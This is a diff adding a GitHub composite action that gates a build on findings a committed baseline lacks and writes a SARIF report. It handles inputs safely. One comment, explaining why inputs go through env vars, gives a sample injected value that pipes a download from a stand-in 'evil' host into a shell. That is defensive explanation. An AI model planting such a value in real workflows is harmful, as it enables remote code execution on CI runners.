@@ -1,0 +1,93 @@
+name: MR-Spark gate
+description: Fail only on findings a committed baseline does not already have; write SARIF for code scanning.
+
+# One action, one job: run the gate and fail the build. It deliberately does not upload the SARIF,
+# install the CLI, or write a missing baseline — see docs/adr/0006-the-gate-action-audits-and-the-workflow-publishes.md.
+#
+# Every value crosses into the shell through `env:`, never through `${{ }}` inside `run:`. Action inputs
+# are interpolated into a script before bash sees it, so a target path containing `"; curl evil | sh;`
+# would become code. The quoting below is what makes that a filename instead.
+
+inputs:
+  target:
+    description: The page to audit — a file in the checkout, or a URL.
+    required: true
+  baseline:
+    description: The committed baseline file `spark baseline` wrote.
+    default: .spark-baseline.json
+  sarif:
+    description: Where to write the SARIF report. Empty means do not write one.
+    default: .spark/spark-gate.sarif
+  strict:
+    description: true also fails on findings from rules the baseline never listed.
+    default: 'false'
+  fail-under:
+    description: Also require this conformance score, 0-100. Empty means do not check it.
+    default: ''
+  spark:
+    description: The CLI command line to run, split on spaces. Override it for a local build.
+    default: spark
+  working-directory:
+    description: Where to run, relative to the repository root.
+    default: '.'
+
+runs:
+  using: composite
+  steps:
+    - name: Gate the page on its baseline
+      shell: bash
+      working-directory: ${{ inputs.working-directory }}
+      env:
+        SPARK: ${{ inputs.spark }}
+        SPARK_TARGET: ${{ inputs.target }}
+        SPARK_BASELINE: ${{ inputs.baseline }}
+        SPARK_SARIF: ${{ inputs.sarif }}
+        SPARK_STRICT: ${{ inputs.strict }}
+        SPARK_FAIL_UNDER: ${{ inputs.fail-under }}
+      run: |
+        set -euo pipefail
+        read -r -a cmd <<< "$SPARK"
+
+        case "$SPARK_STRICT" in
+          true) SPARK_STRICT=true ;;
+          false|'') SPARK_STRICT=false ;;
+          *)
+            echo "::error::spark-gate: strict must be true or false; got '$SPARK_STRICT'. A flag that silently means nothing is worse than one that fails."
+            exit 2
+            ;;
+        esac
+
+        # ${arr[@]+"${arr[@]}"} is the empty-array-safe expansion: `set -u` under bash 4.3 treats
+        # "${arr[@]}" as an unset variable, and a gate that dies on its own runner's bash version is a
+        # gate people blame on the tool.
+        extra=()
+        if [ "$SPARK_STRICT" = true ]; then extra+=(--strict); fi
+        if [ -n "$SPARK_FAIL_UNDER" ]; then extra+=(--fail-under "$SPARK_FAIL_UNDER"); fi
+
+        # The verdict comes from this run — the human-shaped one, whose findings list belongs in the log.
+        code=0
+        "${cmd[@]}" check "$SPARK_TARGET" --ci --no-color --baseline "$SPARK_BASELINE" ${extra[@]+"${extra[@]}"} || code=$?
+
+        if [ -n "$SPARK_SARIF" ]; then
+          mkdir -p "$(dirname "$SPARK_SARIF")"
+          # A second non-zero exit would add nothing to the verdict the line above already recorded, and
+          # the payload is what a reviewer needs even when the build failed — that is the case where the
+          # annotations matter most. Hence `|| true`.
+          "${cmd[@]}" check "$SPARK_TARGET" --ci --no-color --baseline "$SPARK_BASELINE" \
+            --format sarif --out "$SPARK_SARIF" ${extra[@]+"${extra[@]}"} >/dev/null || true
+
+          # The step summary is written from the payload that was just produced, not from a second
+          # opinion: one number, one source. And it can never fail the build, because the build is already
+          # decided above.
+          if [ -f "$SPARK_SARIF" ] && [ -n "${GITHUB_STEP_SUMMARY:-}" ]; then
+            node "$GITHUB_ACTION_PATH/summary.mjs" "$SPARK_SARIF" >> "$GITHUB_STEP_SUMMARY" || true
+          fi
+
+          # Only when the payload exists: pointing at a file that was never written (no baseline, so the
+          # run stopped before formatting anything) is a notice that sends someone to look for nothing.
+          if [ -f "$SPARK_SARIF" ]; then
+            echo "::notice::spark-gate: wrote $SPARK_SARIF. Upload it with github/codeql-action/upload-sarif@v3 (needs security-events: write) to put the new findings on the diff."
+          fi
+        fi
+
+        exit "$code"
